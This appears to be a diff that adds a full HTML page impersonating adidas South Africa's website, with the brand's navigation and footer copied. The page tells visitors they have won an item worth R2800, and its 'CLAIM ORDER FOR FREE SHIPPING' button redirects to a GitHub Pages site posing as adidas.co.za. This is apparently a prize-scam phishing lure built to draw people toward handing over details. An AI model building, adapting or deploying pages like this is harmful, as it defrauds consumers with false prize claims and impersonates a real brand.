@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Congratulations | adidas South Africa</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'AdihausDIN', Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            overflow-x: hidden;
+        }
+        
+        /* Top banner */
+        .top-banner {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #000;
+            color: #fff;
+            padding: 5px 0;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            font-weight: 500;
+        }
+        
+        .top-banner div {
+            flex: 1;
+            text-align: center;
+        }
+        
+        /* Secondary nav */
+        .secondary-nav {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            padding: 5px 20px;
+            gap: 15px;
+            font-size: 0.75rem;
+        }
+        
+        .secondary-nav a {
+            color: #000;
+            text-decoration: none;
+        }
+        
+        .login {
+            color: #0071ae !important;
+        }
+        
+        /* Main navigation */
+        .main-nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            border-bottom: 1px solid #e9ecef;
+        }
+        
+        .logo img {
+            width: 70px;
+            height: auto;
+        }
+        
+        .nav-links {
+            display: flex;
+            list-style: none;
+        }
+        
+        .nav-links li {
+            padding: 20px 15px;
+            text-transform: uppercase;
+            font-weight: bold;
+            font-size: 0.9rem;
+        }
+        
+        .nav-links li a {
+            text-decoration: none;
+            color: #000;
+        }
+        
+        .outlet {
+            color: #e32b2b !important;
+        }
+        
+        .search-cart {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .search-box {
+            display: flex;
+            align-items: center;
+            border: 1px solid #e9ecef;
+            border-radius: 2px;
+            padding: 5px 10px;
+        }
+        
+        .search-box input {
+            border: none;
+            outline: none;
+            width: 120px;
+        }
+        
+        .cart-badge {
+            position: relative;
+        }
+        
+        .badge {
+            position: absolute;
+            top: -5px;
+            right: -8px;
+            background-color: #0071ae;
+            color: white;
+            border-radius: 50%;
+            width: 16px;
+            height: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.7rem;
+        }
+        
+        /* Congratulations section */
+        .congratulations-container {
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 30px;
+            background-color: #f8f8f8;
+            border-radius: 5px;
+            text-align: center;
+        }
+        
+        .congratulations-title {
+            color: #e32b2b;
+            font-size: 2rem;
+            margin-bottom: 20px;
+        }
+        
+        .congratulations-text {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        
+        .package-image {
+            width: 250px;
+            margin: 20px auto;
+            border-radius: 5px;
+        }
+        
+        .value-text {
+            background-color: #f0f0f0;
+            display: inline-block;
+            padding: 10px 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+            font-weight: bold;
+            color: #6200ee;
+        }
+        
+        .claim-button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1rem;
+            text-transform: uppercase;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .claim-button:hover {
+            background-color: #45a049;
+        }
+        
+        /* Footer */
+        footer {
+            background-color: black;
+            color: white;
+            padding: 50px 20px;
+            margin-top: 50px;
+        }
+        
+        .footer-divider {
+            border-bottom: 1px solid #444;
+            margin: 20px 0 40px;
+        }
+        
+        .footer-content {
+            display: flex;
+            justify-content: space-around;
+            gap: 20px;
+        }
+        
+        .footer-column {
+            flex: 1;
+        }
+        
+        .footer-column h3 {
+            text-transform: uppercase;
+            font-size: 0.9rem;
+            margin-bottom: 15px;
+        }
+        
+        .footer-column ul {
+            list-style: none;
+        }
+        
+        .footer-column li {
+            margin-bottom: 10px;
+        }
+        
+        .footer-column a {
+            color: white;
+            text-decoration: none;
+            font-size: 0.8rem;
+        }
+        
+        .social-icons {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .social-icons a {
+            display: inline-block;
+            width: 30px;
+            height: 30px;
+            background-color: white;
+            color: black;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .footer-bottom {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #333;
+        }
+        
+        .footer-bottom a {
+            color: #999;
+            text-decoration: none;
+            font-size: 0.75rem;
+        }
+        
+        /* Responsive styles */
+        @media (max-width: 1024px) {
+            .nav-links li {
+                padding: 20px 10px;
+                font-size: 0.8rem;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .top-banner {
+                flex-direction: column;
+                padding: 10px 0;
+            }
+            
+            .top-banner div {
+                margin-bottom: 5px;
+            }
+            
+            .nav-links {
+                display: none;
+            }
+            
+            .footer-content {
+                flex-direction: column;
+            }
+            
+            .footer-column {
+                margin-bottom: 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Top banner -->
+    <div class="top-banner">
+        <div>FREE DELIVERY OVER R450</div>
+        <div>JOIN ADICLUB</div>
+        <div>MANAGE YOUR COOKIE PREFERENCES</div>
+    </div>
+    
+    <!-- Secondary navigation -->
+    <div class="secondary-nav">
+        <a href="#">adidas official website South Africa</a>
+        <a href="#">help</a>
+        <a href="#">order tracker</a>
+        <a href="#">adiclub</a>
+        <a href="#">returns</a>
+        <a href="#" class="login">login</a>
+    </div>
+    
+    <!-- Main navigation -->
+    <nav class="main-nav">
+        <div class="logo">
+            <a href="#"><img src="image/adidas_logo.svg" alt="adidas logo"></a>
+        </div>
+        
+        <ul class="nav-links">
+            <li><a href="#">SHOES</a></li>
+            <li><a href="#">MEN</a></li>
+            <li><a href="#">WOMEN</a></li>
+            <li><a href="#">KIDS</a></li>
+            <li><a href="#">SPORTS</a></li>
+            <li><a href="#">LIFESTYLE</a></li>
+            <li><a href="#">NEW</a></li>
+            <li><a href="#" class="outlet">OUTLET</a></li>
+        </ul>
+        
+        <div class="search-cart">
+            <div class="search-box">
+                <input type="text" placeholder="Search">
+                <i class="fas fa-search"></i>
+            </div>
+            <a href="#"><i class="far fa-user"></i></a>
+            <a href="#"><i class="far fa-heart"></i></a>
+            <a href="#" class="cart-badge">
+                <i class="fas fa-shopping-bag"></i>
+                <span class="badge">1</span>
+            </a>
+        </div>
+    </nav>
+    
+    <!-- Congratulations section -->
+    <div class="congratulations-container">
+        <h1 class="congratulations-title">Congratulations!</h1>
+        <p class="congratulations-text">You have won an item worth 2800 from ADIDAS ZA!</p>
+        
+        <img src="image/download.jpg" alt="Courier Guy Package" class="package-image">
+        
+        <div class="value-text">Value: R2800</div>
+        
+        <button class="claim-button" onclick="window.location.href='https://sam1111d.github.io/adidas.co.za/shipping.html'">CLAIM ORDER FOR FREE SHIPPING</button>
+    </div>
+    
+    <!-- Footer -->
+    <footer>
+        <div class="footer-divider"></div>
+        
+        <div class="footer-content">
+            <div class="footer-column">
+                <h3>PRODUCTS</h3>
+                <ul>
+                    <li><a href="#">Shoes</a></li>
+                    <li><a href="#">Clothing</a></li>
+                    <li><a href="#">Accessories</a></li>
+                    <li><a href="#">Outlet</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-column">
+                <h3>SPORTS</h3>
+                <ul>
+                    <li><a href="#">Soccer</a></li>
+                    <li><a href="#">Motorsport</a></li>
+                    <li><a href="#">Running</a></li>
+                    <li><a href="#">Training</a></li>
+                    <li><a href="#">Outdoor</a></li>
+                    <li><a href="#">Golf</a></li>
+                    <li><a href="#">Rugby</a></li>
+                    <li><a href="#">Swimming</a></li>
+                    <li><a href="#">Tennis</a></li>
+                    <li><a href="#">Basketball</a></li>
+                    <li><a href="#">Hockey</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-column">
+                <h3>COLLECTIONS</h3>
+                <ul>
+                    <li><a href="#">Originals</a></li>
+                    <li><a href="#">Stella McCartney</a></li>
+                    <li><a href="#">Stan Smith</a></li>
+                    <li><a href="#">Disney</a></li>
+                    <li><a href="#">Ultraboost</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-column">
+                <h3>COMPANY INFO</h3>
+                <ul>
+                    <li><a href="#">About Us</a></li>
+                    <li><a href="#">Careers</a></li>
+                    <li><a href="#">Press</a></li>
+                    <li><a href="#">Carbon Footprint</a></li>
+                    <li><a href="#">P&H policy</a></li>
+                    <li><a href="#">adiClub</a></li>
+                    <li><a href="#">adidas Runners</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-column">
+                <h3>SUPPORT</h3>
+                <ul>
+                    <li><a href="#">Contact Us</a></li>
+                    <li><a href="#">FAQ</a></li>
+                    <li><a href="#">Shipping</a></li>
+                    <li><a href="#">Returns</a></li>
+                    <li><a href="#">adiClub & Newsletter</a></li>
+                    <li><a href="#">Size Charts</a></li>
+                    <li><a href="#">Vouchers</a></li>
+                    <li><a href="#">Storefinder</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-column">
+                <h3>FOLLOW US</h3>
+                <div class="social-icons">
+                    <a href="#"><i class="fab fa-facebook-f"></i></a>
+                    <a href="#"><i class="fab fa-instagram"></i></a>
+                    <a href="#"><i class="fab fa-youtube"></i></a>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer-bottom">
+            <a href="#">Data Settings</a>
+            <a href="#">Cookie Settings</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms And Conditions</a>
+            <a href="#">Imprint</a>
+        </div>
+    </footer>
+</body>
+</html>
